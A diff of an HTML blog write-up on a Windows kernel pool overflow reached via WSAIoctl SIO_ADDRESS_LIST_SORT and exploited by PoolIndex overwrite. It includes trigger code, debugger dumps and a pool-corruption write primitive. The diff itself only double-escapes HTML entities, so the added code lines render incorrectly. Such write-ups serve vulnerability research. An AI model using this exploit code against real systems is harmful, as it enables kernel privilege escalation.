@@ -173,7 +173,7 @@ IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,
 
 
 <p>You can reach this code using a <em>WSAIoctl</em> with the code <em>SIO_ADDRESS_LIST_SORT</em> using a call like this :</p>
-<div class="highlight"><pre><span></span>WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
+<div class="highlight"><pre><span></span>WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;amp;cb, NULL, NULL)
 </pre></div>
 
 
@@ -204,15 +204,15 @@ buffer[0] = 0x17;
 buffer[1] = 0x00;
 sa.lpSockaddr = (LPSOCKADDR)buffer;
 sa.iSockaddrLength = 0x1c;
-pwn-&gt;iAddressCount = 0x40000003;
-memcpy(&amp;pwn-&gt;Address[0],&amp;sa,sizeof(_SOCKET_ADDRESS));
-memcpy(&amp;pwn-&gt;Address[1],&amp;sa,sizeof(_SOCKET_ADDRESS));
-memcpy(&amp;pwn-&gt;Address[2],&amp;sa,sizeof(_SOCKET_ADDRESS));
-memcpy(&amp;pwn-&gt;Address[3],&amp;sa,sizeof(_SOCKET_ADDRESS));
+pwn-&amp;gt;iAddressCount = 0x40000003;
+memcpy(&amp;amp;pwn-&amp;gt;Address[0],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+memcpy(&amp;amp;pwn-&amp;gt;Address[1],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+memcpy(&amp;amp;pwn-&amp;gt;Address[2],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+memcpy(&amp;amp;pwn-&amp;gt;Address[3],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
 
-WSAStartup(MAKEWORD(2,0), &amp;wd)
+WSAStartup(MAKEWORD(2,0), &amp;amp;wd)
 sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
-WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
+WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;amp;cb, NULL, NULL)
 </pre></div>
 
 
@@ -245,11 +245,11 @@ ExFreePoolWithTag(x,x)+64C                  int     3               ; Trap to De
 <h1 id="exploitation-technique">Exploitation technique</h1>
 <h2 id="basic-structure">Basic structure</h2>
 <p>As the internals of the pool are thoroughly detailed in Tarjei Mandt’s paper <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>, I will only be giving a glimpse at the pool descriptor and the pool header structures. The pool memory is divided into several types of pool. Two of them are the paged pool and the non-paged pool. A pool is described by a <em>_POOL_DESCRIPTOR</em> structure as seen below.</p>
-<div class="highlight"><pre><span></span>0: kd&gt; dt _POOL_TYPE
+<div class="highlight"><pre><span></span>0: kd&amp;gt; dt _POOL_TYPE
 ntdll!_POOL_TYPE
    NonPagedPool = 0n0
    PagedPool = 0n1
-0: kd&gt; dt _POOL_DESCRIPTOR
+0: kd&amp;gt; dt _POOL_DESCRIPTOR
 nt!_POOL_DESCRIPTOR
    +0x000 PoolType         : _POOL_TYPE
    +0x004 PagedLock        : _KGUARDED_MUTEX
@@ -268,7 +268,7 @@ nt!_POOL_DESCRIPTOR
 
 
 <p>A pool descriptor references free memory in a free list called <em>ListHeads</em>. The <em>PendingFrees</em> field references chunks of memory waiting to be freed to the free list. Pointers to pool descriptor structures are stored in arrays such as <em>PoolVector</em> (non-paged) or <em>ExpPagedPoolDescriptor</em> (paged). Each chunk of memory contains a header before the actual data. This is the <em>_POOL_HEADER</em>. It brings information such as the size of the block or the pool it belongs to.</p>
-<div class="highlight"><pre><span></span>0: kd&gt; dt _POOL_HEADER
+<div class="highlight"><pre><span></span>0: kd&amp;gt; dt _POOL_HEADER
 nt!_POOL_HEADER
    +0x000 PreviousSize     : Pos 0, 9 Bits
    +0x000 PoolIndex        : Pos 9, 7 Bits
@@ -283,7 +283,7 @@ nt!_POOL_HEADER
 
 <h2 id="poolindex-overwrite">PoolIndex overwrite</h2>
 <p>The basic idea of this attack is to corrupt the <em>PoolIndex</em> field of a pool header. This field is used when deallocating paged pool chunks in order to know which pool descriptor it belongs to. It is used as an index in an array of pointers to pool descriptors. Thus, if an attacker is able to corrupt it, he can make the pool manager believe that a specific chunk belongs to another pool descriptor. For instance, one could reference a pool descriptor out of the bounds of the array. </p>
-<div class="highlight"><pre><span></span>0: kd&gt; dd ExpPagedPoolDescriptor
+<div class="highlight"><pre><span></span>0: kd&amp;gt; dd ExpPagedPoolDescriptor
 82947ae0  84835000 84836140 84837280 848383c0
 82947af0  84839500 00000000 00000000 00000000
 </pre></div>
@@ -340,7 +340,7 @@ ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
 <p>When freeing a chunk, if the deferred freelist contains at least 0x20 entries, <em>ExFreePoolWithTag</em> is going to actually free those chunks and put them on the appropriate entries of the <em>ListHeads</em>. </p>
 <div class="highlight"><pre><span></span><span class="o">*</span><span class="p">(</span><span class="n">PCHAR</span><span class="o">*</span><span class="p">)</span><span class="mh">0x100</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="mh">0x1208</span><span class="p">;</span> 
 <span class="o">*</span><span class="p">(</span><span class="n">PCHAR</span><span class="o">*</span><span class="p">)</span><span class="mh">0x104</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="mh">0x20</span><span class="p">;</span>
-<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mh">0x140</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1140</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mh">0x140</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mh">0x1140</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
     <span class="o">*</span><span class="p">(</span><span class="n">PCHAR</span><span class="o">*</span><span class="p">)</span><span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">WriteAddress</span><span class="o">-</span><span class="mi">4</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="o">*</span><span class="p">(</span><span class="n">PINT</span><span class="p">)</span><span class="mh">0x1200</span> <span class="o">=</span> <span class="p">(</span><span class="n">INT</span><span class="p">)</span><span class="mh">0x060c0a00</span><span class="p">;</span>
